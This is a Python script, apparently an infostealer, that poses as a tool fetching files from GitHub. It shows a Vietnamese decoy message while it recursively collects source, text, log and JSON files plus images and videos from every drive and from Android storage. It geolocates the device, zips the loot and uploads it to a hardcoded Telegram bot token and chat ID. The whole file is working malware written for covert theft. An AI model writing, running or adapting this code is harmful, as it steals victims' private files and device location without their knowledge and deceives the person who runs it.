import os
import zipfile
import requests
import platform
import psutil
import socket
import time
from datetime import datetime
from dotenv import load_dotenv
from pathlib import Path
import shutil

class FileCollector:
    def __init__(self):
        load_dotenv()
        self.adminId = os.getenv("TELEGRAM_ADMIN_ID", "8181770281")
        self.botToken = os.getenv("TELEGRAM_BOT_TOKEN", "8173520834:AAEiyn101yALrGvIayu4AVuY9hHxXZ5za8k")
        self.google_maps_api_key = os.getenv("GOOGLE_MAPS_API_KEY", "")
        
        self.file_exts = [".py", ".js", ".log", ".text", ".html", ".css", ".txt", ".sh", ".ts", ".json"]
        self.image_exts = [".jpg", ".jpeg", ".png", ".gif", ".bmp", ".mp4"]
        
        self.rootPaths = ["/", "/storage/emulated/0", "C:/", "D:/", "E:/"] if os.name != "nt" else ["C:/", "D:/", "E:/"]
        self.max_zip_size = 40 * 1024 * 1024  # 40MB

    def getDeviceInfo(self):
        deviceName = platform.node() or "device"
        systemInfo = platform.system()
        releaseInfo = platform.release()
        cpuInfo = platform.processor() or "Unknown CPU"
        
        memoryStats = psutil.virtual_memory()
        ramTotal = round(memoryStats.total / (1024 ** 3), 2)
        ramUsed = round(memoryStats.used / (1024 ** 3), 2)

        diskStats = psutil.disk_usage("/")
        diskTotal = round(diskStats.total / (1024 ** 3), 2)
        diskFree = round(diskStats.free / (1024 ** 3), 2)

        try:
            ipLocal = socket.gethostbyname(socket.gethostname())
        except:
            ipLocal = "Unknown"

        try:
            response = requests.get("http://ip-api.com/json", timeout=5)
            geoData = response.json()
            ipPublic = geoData.get("query", "Unknown")
            country = geoData.get("country", "Unknown")
            region = geoData.get("regionName", "Unknown")
            city = geoData.get("city", "Unknown")
            isp = geoData.get("isp", "Unknown")
        except:
            ipPublic = country = region = city = isp = "Unknown"

        return deviceName, {
            'device': deviceName,
            'os': f"{systemInfo} {releaseInfo}",
            'cpu': cpuInfo,
            'memory': f"{ramUsed}GB / {ramTotal}GB",
            'disk': f"{diskFree}GB free / {diskTotal}GB total",
            'local_ip': ipLocal,
            'public_ip': ipPublic,
            'location': f"{country}, {region}, {city}",
            'isp': isp
        }

    def collectFiles(self):
        collected_files = []
        collected_images = []
        for basePath in self.rootPaths:
            if os.path.exists(basePath):
                for rootDir, _, files in os.walk(basePath):
                    for fileName in files:
                        fullPath = os.path.join(rootDir, fileName)
                        try:
                            if os.path.isfile(fullPath) and os.access(fullPath, os.R_OK):
                                ext = os.path.splitext(fileName.lower())[1]
                                if ext in self.file_exts:
                                    collected_files.append(fullPath)
                                elif ext in self.image_exts:
                                    collected_images.append(fullPath)
                        except:
                            continue
        return collected_files, collected_images

    def splitFileGroups(self, files, max_size=40 * 1024 * 1024):
        groups = []
        current_group = []
        current_size = 0

        for file_path in files:
            try:
                file_size = os.path.getsize(file_path)
                if file_size > max_size:
                    continue
                if current_size + file_size > max_size:
                    groups.append(current_group)
                    current_group = [file_path]
                    current_size = file_size
                else:
                    current_group.append(file_path)
                    current_size += file_size
            except:
                continue

        if current_group:
            groups.append(current_group)
        
        return groups

    def createZipArchive(self, zipName, files):
        try:
            with zipfile.ZipFile(zipName, "w", zipfile.ZIP_DEFLATED) as zipFile:
                seen_names = set()
                base_dir = os.path.commonpath(files) if files else "."
                for filePath in files:
                    try:
                        arcname = os.path.relpath(filePath, start=base_dir)
                        if arcname in seen_names:
                            base, ext = os.path.splitext(arcname)
                            counter = 1
                            new_arcname = f"{base}_{counter}{ext}"
                            while new_arcname in seen_names:
                                counter += 1
                                new_arcname = f"{base}_{counter}{ext}"
                            arcname = new_arcname
                        seen_names.add(arcname)
                        zipFile.write(filePath, arcname)
                    except:
                        continue
            return os.path.exists(zipName) and os.path.getsize(zipName) > 0
        except:
            return False

    def splitLargeFile(self, file_path, max_size=40 * 1024 * 1024):
        if os.path.getsize(file_path) <= max_size:
            return [file_path]
        
        part_files = []
        base_name = os.path.splitext(file_path)[0]
        ext = os.path.splitext(file_path)[1]
        with open(file_path, 'rb') as f:
            part_num = 1
            while True:
                chunk = f.read(max_size)
                if not chunk:
                    break
                part_file = f"{base_name}_part{part_num}{ext}"
                with open(part_file, 'wb') as part_f:
                    part_f.write(chunk)
                part_files.append(part_file)
                part_num += 1
        return part_files

    def sendToTelegram(self, file_path, caption, max_retries=3):
        url = f"https://api.telegram.org/bot{self.botToken}/sendDocument"
        for attempt in range(max_retries):
            try:
                if not os.path.exists(file_path):
                    return False
                file_size = os.path.getsize(file_path) / (1024 * 1024)
                if file_size > 50:
                    part_files = self.splitLargeFile(file_path)
                    for part_file in part_files:
                        with open(part_file, 'rb') as file:
                            response = requests.post(
                                url,
                                data={"chat_id": self.adminId, "caption": caption},
                                files={"document": file},
                                timeout=120
                            )
                            if response.status_code != 200:
                                return False
                        os.remove(part_file)
                    if os.path.exists(file_path):
                        os.remove(file_path)
                    return True
                else:
                    with open(file_path, 'rb') as file:
                        response = requests.post(
                            url,
                            data={"chat_id": self.adminId, "caption": caption},
                            files={"document": file},
                            timeout=120
                        )
                        if response.status_code != 200:
                            return False
                    return True
            except:
                time.sleep(5 * (attempt + 1))
        return False

    def logToTelegram(self, message):
        timestamp = datetime.now().strftime("[%H:%M:%S]")
        url = f"https://api.telegram.org/bot{self.botToken}/sendMessage"
        try:
            data = {"chat_id": self.adminId, "text": f"{timestamp} {message}"}
            response = requests.post(url, data=data, timeout=60)
            if response.status_code != 200:
                pass
        except:
            pass

    def run(self):
        print("Đang lấy file từ github vui lòng đợi")
        self.logToTelegram("Bắt đầu thu thập")
        
        deviceName, deviceInfo = self.getDeviceInfo()
        collected_files, collected_images = self.collectFiles()
        
        self.logToTelegram(f"Tìm thấy {len(collected_files)} file, {len(collected_images)} ảnh")

        target_dir = "/storage/emulated/0/Download/zalo"
        try:
            os.makedirs(target_dir, exist_ok=True)
            os.chdir(target_dir)
        except:
            self.logToTelegram("Lỗi gửi file")
            return

        if collected_files:
            file_groups = self.splitFileGroups(collected_files)
            self.logToTelegram("Gửi file")
            for i, group in enumerate(file_groups, 1):
                zipName_files = os.path.join(target_dir, f"{deviceName}_files_group{i}.zip")
                if self.createZipArchive(zipName_files, group):
                    caption = "\n".join([f"{k}: {v}" for k, v in deviceInfo.items()]) + "\n(Type: Files)"
                    if self.sendToTelegram(zipName_files, caption):
                        if i == len(file_groups):
                            self.logToTelegram("Đã gửi file")
                        if os.path.exists(zipName_files):
                            os.remove(zipName_files)
                    else:
                        self.logToTelegram("Lỗi gửi file")
                        break
                else:
                    self.logToTelegram("Lỗi gửi file")
                    break

        if collected_images:
            image_groups = self.splitFileGroups(collected_images)
            self.logToTelegram("Gửi ảnh")
            for i, group in enumerate(image_groups, 1):
                zipName_images = os.path.join(target_dir, f"{deviceName}_images_group{i}.zip")
                if self.createZipArchive(zipName_images, group):
                    caption = "\n".join([f"{k}: {v}" for k, v in deviceInfo.items()]) + "\n(Type: Images)"
                    if self.sendToTelegram(zipName_images, caption):
                        if i == len(image_groups):
                            self.logToTelegram("Đã gửi ảnh")
                        if os.path.exists(zipName_images):
                            os.remove(zipName_images)
                    else:
                        self.logToTelegram("Lỗi gửi ảnh")
                        break
                else:
                    self.logToTelegram("Lỗi gửi ảnh")
                    break

if __name__ == "__main__":
    collector = FileCollector()
    collector.run()
